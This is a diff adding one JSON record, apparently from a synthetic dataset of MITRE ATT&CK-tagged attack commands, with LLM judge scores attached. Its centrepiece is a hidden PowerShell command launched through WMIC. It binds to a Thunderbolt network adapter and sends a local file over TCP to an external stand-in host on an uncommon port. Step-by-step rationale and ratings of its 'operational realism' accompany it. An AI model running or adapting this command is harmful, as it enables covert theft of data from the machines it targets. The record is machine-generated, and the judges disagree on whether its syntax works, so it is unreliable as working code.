@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Thunderbolt*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('203.0.113.155',54901); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\ProgramData\\Temp\\blob.dat'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
+  "explanation": "Invokes PowerShell via WMIC to bind to a Thunderbolt network adapter and send data over TCP to a non-standard port. Thunderbolt networking is used as an alternate medium to the primary network per T1011.",
+  "rationale_steps": [
+    "Locate a Thunderbolt NIC via WMI adapter description.",
+    "Bind a TCP client to the Thunderbolt interface's IPv4 address.",
+    "Connect to an external destination using a high, uncommon port.",
+    "Exfiltrate data over the Thunderbolt network path.",
+    "No persistent or system-wide network reconfiguration is performed."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-987933e0-4e9ac17f",
+  "source_prompt_hash": "987933e0",
+  "timestamp_utc": "2025-09-30T08:13:32.291694Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 2,
+        "syntactic_justification": "Quoting and separators are balanced, but escaping PowerShell variables with backticks (e.g., `$ifc, `$_. ) outside strings renders the inline script invalid and likely to fail parsing.",
+        "semantic_score": 4,
+        "semantic_justification": "The logic selects a Thunderbolt adapter, binds the TCP client to its IP, and exfiltrates a file over a non-standard port, aligning with T1011, though the reserved destination IP and deprecated WMIC reduce operational realism.",
+        "combined_score": 3.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T01:08:34.812962Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is largely well-formed with proper escaping of backtick-prefixed variables for WMIC/PowerShell nesting, balanced braces and parentheses, though the complex multi-level quoting and backtick escaping within the WMIC call create context introduces edge-case parsing fragility.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements T1011 by discovering a Thunderbolt network adapter via WMI, binding a TCP socket to its IP address, and exfiltrating a file to an external IP on a non-standard port, which is operationally plausible as an alternate-medium exfiltration technique, though Thunderbolt networking (IP-over-Thunderbolt) is a niche configuration that may not be present on most targets, slightly reducing realism.",
+        "combined_score": 4.0,
+        "confidence": 0.82,
+        "timestamp": "2026-02-18T22:05:48.579836Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct WMIC process creation syntax and valid PowerShell code with proper escaping of variables for execution within a string.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements MITRE ATT&CK T1011 by specifically identifying a Thunderbolt network adapter and binding the TCP socket to that interface's IP address, ensuring data exfiltration occurs over the alternate medium.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:05:51.697409Z"
+      }
+    ],
+    "llm_average_syntactic": 3.667,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.0,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
